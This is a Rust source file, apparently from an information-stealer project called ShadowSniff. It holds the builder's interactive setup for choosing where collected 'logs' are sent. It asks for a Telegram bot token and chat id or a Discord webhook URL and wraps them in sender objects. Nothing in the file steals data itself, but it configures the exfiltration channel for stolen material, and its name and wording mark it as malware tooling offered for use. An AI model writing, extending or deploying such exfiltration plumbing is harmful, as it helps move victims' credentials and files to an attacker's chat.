/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
use std::fmt::Display;
use inquire::{InquireError, Select, Text};
use sender::discord_webhook::DiscordWebhookSender;
use sender::telegram_bot::TelegramBotSender;
use crate::Ask;

impl Ask for TelegramBotSender {
    fn ask() -> Result<Self, InquireError>
    where
        Self: Sized
    {
        let token = Text::new("Bot token from @BotFather")
            .with_help_message("You can get it by creating a bot using @BotFather")
            .prompt()?;

        let chat_id = Text::new("Chat id")
            .with_help_message("You can use https://emmarnitechs.com/find-change-user-id-telegram to find your telegram id")
            .prompt()?;

        Ok(Self::new(token, chat_id))
    }
}

impl Ask for DiscordWebhookSender {
    fn ask() -> Result<Self, InquireError>
    where
        Self: Sized
    {
        let webhook = Text::new("Webhook url")
            .with_help_message("If you stuck, read https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks")
            .prompt()?;

        Ok(Self::new(webhook))
    }
}

#[derive(Clone)]
pub enum SenderService {
    TelegramBot(TelegramBotSender),
    DiscordWebhook(DiscordWebhookSender),
}

struct TelegramFactory;
struct DiscordFactory;

impl Display for TelegramFactory {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "Telegram Bot")
    }
}
impl Display for DiscordFactory {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "Discord Webhook")
    }
}

trait ServiceFactory: Display {
    fn ask_instance(&self) -> Result<SenderService, InquireError>;
}

impl ServiceFactory for TelegramFactory {
    fn ask_instance(&self) -> Result<SenderService, InquireError> {
        Ok(SenderService::TelegramBot(TelegramBotSender::ask()?))
    }
}
impl ServiceFactory for DiscordFactory {
    fn ask_instance(&self) -> Result<SenderService, InquireError> {
        Ok(SenderService::DiscordWebhook(DiscordWebhookSender::ask()?))
    }
}

impl Ask for SenderService {
    fn ask() -> Result<Self, InquireError>
    where
        Self: Sized
    {
        let factories: Vec<Box<dyn ServiceFactory>> = vec![
            Box::new(TelegramFactory),
            Box::new(DiscordFactory),
        ];

        let ans = Select::new("In which service the log to be sent?", factories)
            .prompt()?;

        ans.ask_instance()
    }
}